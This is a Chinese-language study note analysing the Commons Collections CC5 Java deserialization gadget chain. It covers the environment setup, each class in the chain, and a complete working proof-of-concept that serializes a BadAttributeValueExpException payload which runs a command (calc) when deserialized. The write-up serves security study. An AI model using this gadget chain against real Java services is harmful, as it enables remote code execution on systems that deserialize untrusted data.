# 0x00 前置知识
## 0.1 writeObject和readObject

Java 在序列化一个对象时，将会调用这个对象中的 `writeObject` 方法，参数类型是 `ObjectOutputStream` ，开发者可以将任何内容写入这个 `stream` 中；

反序列化时，会调用 `readObject` ，开发者也可以从中读取出前面写入的内容，并进行处理。

## 0.2 如何寻找Gadget?
一条完整的 `Gadget` ，应当具备以下成分：

- 入口类
- 链中类
- 危险方法（例如 `Runtime.getRuntime().exec()` )
  - 不同类的同名函数
  - 任意方法调用（反射/动态加载字节码）

入口类条件：

- 可序列化
- 能重写 `readObject`
- 接收任意对象作为参数（集合类型/接收 `Object` ）

链中类条件：

- 可序列化
- 接收任意对象作为参数（集合类型/接收 `Object` ）

## 0.3 CC5 利用链图解

![image](https://github.com/reidmu/sec-note/assets/84888757/66964b07-5fa4-49e9-b67d-7308841fb466)


```java
/*
	Gadget chain:
        ObjectInputStream.readObject()
            BadAttributeValueExpException.readObject()
                TiedMapEntry.toString()
                    LazyMap.get()
                        ChainedTransformer.transform()
                            ConstantTransformer.transform()
                            InvokerTransformer.transform()
                                Method.invoke()
                                    Class.getMethod()
                            InvokerTransformer.transform()
                                Method.invoke()
                                    Runtime.getRuntime()
                            InvokerTransformer.transform()
                                Method.invoke()
                                    Runtime.exec()
	Requires:
		commons-collections
 */
```
# 0x01 环境搭建
## 1.1 maven项目导入依赖
pom.xml 导入依赖
```xml
<!-- https://mvnrepository.com/artifact/commons-collections/commons-collections -->
<dependency>
    <groupId>commons-collections</groupId>
    	<artifactId>commons-collections</artifactId>
    <version>3.2.1</version>
</dependency>
```
## 1.2 JDK版本及sun包源码
`CC5` 链对 `JDK` 版本暂无限制。

`commons-collections` 利用版本：
- CommonsCollections 3.1 - 3.2.1

`CC5` 链需要用到 `sun` 包中的类，而 `sun` 包在 `jdk` 中的代码是通过 `class` 文件反编译来的，不是 `java` 文件，调试不方便，通过 `find usages` 是搜不到要找的类的，而且其代码中的对象是 `var` 这样的形式，影响代码的阅读。

下载 `sun` 包，把 `src/share/classes` 中的 `sun` 文件夹 放到 `oracle jdk8u66` 的 `src` 文件夹下。

[https://hg.openjdk.java.net/jdk8u/jdk8u/jdk/rev/af660750b2f4](https://hg.openjdk.java.net/jdk8u/jdk8u/jdk/rev/af660750b2f4)

<div align=center><img width="641" alt="image" src="https://user-images.githubusercontent.com/84888757/204700877-5c68fc27-ba97-4dab-a0cd-01a70d91bdeb.png" /></div>

将 `sun` 包复制到对应 `jdk` 的 `src` 目录下（Macbook 是在 `/Library/Java/JavaVirtualMachines/jdk1.8.0_66.jdk/Contents/Home/Src` 下）

<img width="1155" alt="image" src="https://user-images.githubusercontent.com/84888757/204702741-0e8acfc6-52ec-4f28-965b-08e3178d7426.png">

然后在 `IDEA` 中，`File-->Project Structure- ->SDKs` 将 `src` 目录的路径加到 `Sourcepath` 中去：  

<div align=center><img width="894" alt="image" src="https://user-images.githubusercontent.com/84888757/204702840-522354dc-6fc8-4e28-b106-56b240d0908f.png" /></div>

下载 `maven` 源码包：

<div align=center><img width="445" alt="image" src="https://user-images.githubusercontent.com/84888757/204703339-9e7d9b3c-e354-489d-8ff2-e5992f3ddc8f.png" /></div>

# 0x02 CC5 Gadget 思路
## 2.1 危险方法InvokerTransformer#transform
`org.apache.commons.collections.functors.InvokerTransformer#transform` 中使用了反射：

![image](https://github.com/reidmu/sec-note/assets/84888757/2359d26b-945a-495e-87de-b271f437ce5b)

如果用正射的代码解释就是：
```java
input.iMethodName(iArgs);
```

`this.iMethodName`、`this.iParamTypes`、`this.iArgs` 均在 `InvokerTransformer` 的构造方法中可控。由此可以调用 `input` 对象的任意方法，传递任意参数。

![image](https://github.com/reidmu/sec-note/assets/84888757/b9c2e9ca-94d3-4ecc-840a-f3bf766da6a9)


所以我们将通过反射执行命令的代码改成如下形式：
```java
public class CC5_1 {
    public static void main(String[] args) throws Exception{
//        Runtime r = Runtime.getRuntime();
//        Class c = Runtime.class;
//        Method execMethod = c.getMethod("exec", String.class);
//        execMethod.invoke(r, "calc");

        InvokerTransformer invokerTransformer = new InvokerTransformer("exec", new Class[]{String.class}, new Object[]{"calc"});
        invokerTransformer.transform(Runtime.getRuntime());
    }
}
```

但是此时我们产生了两个问题：

1、如何自动执行 `Runtime.getRuntime()` ？ ---> 使用 `ChainedTransformer` 和 `ConstantTransformer` 。

2、如何自动执行 `invokerTransformer.transform()` ？  ---> 应该向前找，谁调用了这个危险方法 。

## 2.2 ChainedTransformer 和 ConstantTransformer

关于第一个问题，我们需要再学习一下另外两个 `Transformer` 接口的实现类，  `ChainedTransformer` 和 `ConstantTransformer` 。

![image](https://github.com/reidmu/sec-note/assets/84888757/00fad1dd-1c59-45eb-8f34-16c63cb3a42e)

其实在 [CC1-TransformedMap](https://github.com/reidmu/sec-note/blob/main/Java-sec/CC1-TransformedMap.md#31-chainedtransformer-%E5%92%8C-constanttransformer) 就学习过 `invokerTransformer`、`ChainedTransformer` 和 `ConstantTransformer` 这三个实现类，现在复习一下。

### 2.2.1 ConstantTransformer

`ConstantTransformer` 是实现了 `Transformer` 接⼝的⼀个类，它的过程就是在构造函数的时候传⼊⼀个对象，并在 `transform` ⽅法将这个对象再返回：

![image](https://github.com/reidmu/sec-note/assets/84888757/01dcb496-48e4-4ecd-9714-d8215768fb87)

所以 `ConstantTransformer` 的作⽤其实就是包装任意⼀个对象，在执⾏回调时返回这个对象，进⽽⽅便后续操作。

### 2.2.2 ChainedTransformer

在 `org.apache.commons.collections.functors.ChainedTransformer#transform` 中可以实现链式调用:

![image](https://github.com/reidmu/sec-note/assets/84888757/eb746319-ec97-4393-82f0-4f17b7989b1b)

`this.iTransformers` 的定义是 `Transformer` 数组

![image](https://github.com/reidmu/sec-note/assets/84888757/fff974d4-0b55-4469-81e5-34987de95949)


`ChainedTransformer` 也是实现了 `Transformer` 接⼝的⼀个类，它的作⽤是将内部的多个 `Transformer` 串在⼀起。

简单来说就是，前⼀个 `transform` 回调方法返回的结果，作为后⼀个 `transform` 回调方法的参数传⼊。

所以我们可以定义一个 `Transformer` 数组，里面放入多个 `InvokerTransformer` 来实现多次反射调用，拿到 `Runtime.getRuntime().exec()` 。

其中很巧妙的是可以通过 `ConstantTransformer` 类的构造方法传入 `Runtime.class` 作为这个 `Transformer` 数组的第一个元素。

📕 CC5_1.java

```java
package org.vulhub.deserializeDemo;

import org.apache.commons.collections.Transformer;
import org.apache.commons.collections.functors.ChainedTransformer;
import org.apache.commons.collections.functors.ConstantTransformer;
import org.apache.commons.collections.functors.InvokerTransformer;

public class CC5_1 {
    public static void main(String[] args) throws Exception {
        Transformer[] transformers = new Transformer[]{
                // 传入Runtime类
                new ConstantTransformer(Runtime.class),
                // 使用Runtime.class.getMethod()反射调用Runtime.getRuntime()
                new InvokerTransformer("getMethod", new Class[]{String.class, Class[].class}, new Object[]{"getRuntime", new Class[0]}),
                // invoke()调用Runtime.class.getMethod("getRuntime").invoke(null)
                new InvokerTransformer("invoke", new Class[]{Object.class, Object[].class}, new Object[]{null, new Object[0]}),
                // 调用exec("calc")
                new InvokerTransformer("exec", new Class[]{String.class}, new String[]{"calc"})
        };
        Transformer chain = new ChainedTransformer(transformers);
        chain.transform(null);
    }
}
```

![image](https://github.com/reidmu/sec-note/assets/84888757/bc0a0c50-6e61-4744-bcb3-232e81a69d4d)

## 2.3 LazyMap#get

现在看第二个问题：

如何自动执行 `invokerTransformer.transform()` ？  

答： 应该向前找，谁调用了这个危险方法 。

右键 `Find Usages`，找到 `LazyMap` 和 `TransformedMap` 都调用了该危险方法。

此次我们要看的是 `LazyMap#get` 方法。

在 `org.apache.commons.collections.map.LazyMap#get` 中调用了 `transform()`

![image](https://github.com/reidmu/sec-note/assets/84888757/654be176-fe7d-4734-93ec-742af50218a4)

看这个 `LazyMap` 类的 `factory` 字段和构造方法。

<div align=center><img src="https://github.com/reidmu/sec-note/assets/84888757/a092920b-c32c-4325-b151-252dfa32c390" /></div>

<div align=center><img src="(https://github.com/reidmu/sec-note/assets/84888757/8c1dcc2d-9998-4dcf-b300-0422cef214f3" /></div>


`factory` 字段是 `final` 、 `protected` 修饰，且 `LazyMap` 类的构造方法都是 `protected` 的，但是有一个 `public` 的方法 `decorate()` 来生成 `LazyMap` 类对象，那么就可以构造出如下代码：

```java
HashMap hashMap = new HashMap();
Map lazymap = LazyMap.decorate(hashMap, chain);
lazymap.get("test");	//执行这个就会弹出计算器  lazymap.get() -> InvokerTransformer.transform()
```

![image](https://github.com/reidmu/sec-note/assets/84888757/f0c8140c-fe82-440a-b9ed-3a357b861e25)


现在再寻找哪里调用了 `LazyMap` 的` get()` 方法。

## 2.4 TiedMapEntry#getValue

`org.apache.commons.collections.keyvalue.TiedMapEntry#getValue` 调用了 `LazyMap#get` 。

（截图好长，直接放 CC5 相关的关键代码部分）

📕 TiedMapEntry.java

```java
private final Map map;
private final Object key;

public TiedMapEntry(Map map, Object key) {
    this.map = map;
    this.key = key;
}
public Object getKey() {
    return this.key;
}
public Object getValue() {
    return this.map.get(this.key);
}
public String toString() {
    return this.getKey() + "=" + this.getValue();
}
```

`TiedMapEntry#getValue` 调用了 `map.get(this.key)` ，当这个 `map` 是 `LazyMap` 时，就是调用的 `LazyMap#get` 。

`this.key` 从 `TiedMapEntry` 的构造方法中传入，是我们可控的。

而 `TiedMapEntry#toString()` 调用了 `this.getValue()` ，进一步构造代码如下：

```java
HashMap hashMap = new HashMap();
Map lazymap = LazyMap.decorate(hashMap, chain);
//        lazymap.get("test");	//执行这个就会弹出计算器  lazymap.get() -> InvokerTransformer.transform()
TiedMapEntry tiedMapEntry = new TiedMapEntry(lazymap, "key");
tiedMapEntry.toString();	// TiedMapEntry.toString -> TiedMapEntry.getValue() -> lazymap.get() -> InvokerTransformer.transform()
```

![image](https://github.com/reidmu/sec-note/assets/84888757/f6a64b1a-0a8b-4bce-8170-545de6cf94cb)

我们知道，反序列化过程会调用到 `readObject` ，所以我们现在需要找的是：

1. xxx#readObject -> ... -> yyy#bb
2. TiedMapEntry#toString
3. TiedMapEntry#getValue
4. LazyMap#get
5. ChainedTransformer#transform
6. InvokerTransformer#transform

## 2.5 BadAttributeValueExpException

在分析 `CC5` 的过程中，我们注意到在 `jdk` 内置类中有一个 `BadAttributeValueExpException` 异常类，其 `readObject()` 会执行 `valObj.toString()` 。

因为 `System.getSecurityManager()` 默认为 `null` ，所以触发 `val = valObj.toString()` 。

当 `valObj` 为 `TiedMapEntry` 时，进入到 `TiedMapEntry.toString()` 。

<div align=center><img src="https://github.com/reidmu/sec-note/assets/84888757/7ef65894-63f7-4727-a0b0-68cb2a64a92d" /></div>


需要注意的是，在声明 `BadAttributeValueExpException` 对象时，我们并不会直接传入 `TiedMapEntry` 参数，而是用反射赋值。

但是我们可以发现 `BadAttributeValueExpException` 这里的构造函数可以直接传参，并且直接调用 `toString` ，那么为什么我们不能直接传入  `TiedMapEntry` ，而要使用反射呢？

![image](https://github.com/reidmu/sec-note/assets/84888757/4f55c4b8-7519-4fac-ac5a-b471a0bb6433)


因为 `BadAttributeValueExpException` 的构造函数会判断 `val` 是否为空，如果不为空，在序列化时（即生成 `payload` 时）就会执行 `toString()` ，触发 `RCE` 。

![image](https://github.com/reidmu/sec-note/assets/84888757/3f9d2c62-b0cf-435c-9880-c9753061942a)

那么反序列化时，因为传入的 `TiedMapEntry` 已经是字符串，所以会进入第一个 `else if(valObj instanceof String)` ，就不会在目标服务端触发 `toString` 方法了。

简单一句话，通过构造函数传入 `TiedMapEntry` 会在我们本地进行一次 `RCE` ，之后 `val` 值就会改变，导致目标服务端在反序列化时无法触发 `RCE` 。

## 2.6 完整的 CC5 Gadget POC

最终构造的 CC5 POC 如下：

📕 CC5_1.java

```java
package org.vulhub.deserializeDemo;

import org.apache.commons.collections.Transformer;
import org.apache.commons.collections.functors.ChainedTransformer;
import org.apache.commons.collections.functors.ConstantTransformer;
import org.apache.commons.collections.functors.InvokerTransformer;
import org.apache.commons.collections.keyvalue.TiedMapEntry;
import org.apache.commons.collections.map.LazyMap;

import javax.management.BadAttributeValueExpException;
import java.io.*;
import java.lang.reflect.Field;
import java.util.HashMap;
import java.util.Map;

public class CC5_1 {
    public static void main(String[] args) throws Exception {
        Transformer[] transformers = new Transformer[]{
                // 传入Runtime类
                new ConstantTransformer(Runtime.class),
                // 使用Runtime.class.getMethod()反射调用Runtime.getRuntime()
                new InvokerTransformer("getMethod", new Class[]{String.class, Class[].class}, new Object[]{"getRuntime", new Class[0]}),
                // invoke()调用Runtime.class.getMethod("getRuntime").invoke(null)
                new InvokerTransformer("invoke", new Class[]{Object.class, Object[].class}, new Object[]{null, new Object[0]}),
                // 调用exec("calc")
                new InvokerTransformer("exec", new Class[]{String.class}, new String[]{"calc"})
        };
        Transformer chain = new ChainedTransformer(transformers);
//        chain.transform(null);
        HashMap hashMap = new HashMap();
        Map lazymap = LazyMap.decorate(hashMap, chain);
//        lazymap.get("test");	//执行这个就会弹出计算器  lazymap.get() -> InvokerTransformer.transform()
        TiedMapEntry tiedMapEntry = new TiedMapEntry(lazymap, "key");
//        tiedMapEntry.toString();	// TiedMapEntry.toString -> TiedMapEntry.getValue() -> lazymap.get() -> InvokerTransformer.transform()


        BadAttributeValueExpException badAttributeValueExpException = new BadAttributeValueExpException(null);
        Field field = badAttributeValueExpException.getClass().getDeclaredField("val");
        field.setAccessible(true);
        field.set(badAttributeValueExpException, tiedMapEntry); // badAttributeValueExpException.readObject -> TiedMapEntry.toString -> TiedMapEntry.getValue() -> lazymap.get() -> InvokerTransformer.transform()

        // 序列化
        serialize(badAttributeValueExpException);
        // 反序列化
        unserialize("ser_CC5_1.bin");
    }

    public static void serialize(Object obj) throws IOException {
        FileOutputStream fileOutputStream = new FileOutputStream("./ser_CC5_1.bin");
        ObjectOutputStream outputStream = new ObjectOutputStream(fileOutputStream);
        outputStream.writeObject(obj);
        outputStream.close();
        fileOutputStream.close();
    }

    public static void unserialize(String ser_file) throws IOException, ClassNotFoundException {
        FileInputStream fileInputStream = new FileInputStream(ser_file);
        ObjectInputStream ois = new ObjectInputStream(fileInputStream);

        ois.readObject();
    }
}
```

![image](https://github.com/reidmu/sec-note/assets/84888757/d060283c-f994-4497-8416-6a8a9215ef0b)


# 0x03 参考链接
- [WebLogic-Shiro-shell#CommonsCollections5 @Y4er](https://github.com/Y4er/WebLogic-Shiro-shell)
- [Java安全漫谈 - 11.LazyMap详解](https://t.zsxq.com/FufUf2B)
- [CC1-LazyMap](https://github.com/reidmu/sec-note/blob/main/Java-sec/CC1-LazyMap.md)
- [Commons-Collections 1-7 分析#CommonsCollections5 @天下大木头](https://www.yuque.com/tianxiadamutou/zcfd4v/ac9529#4e933952)

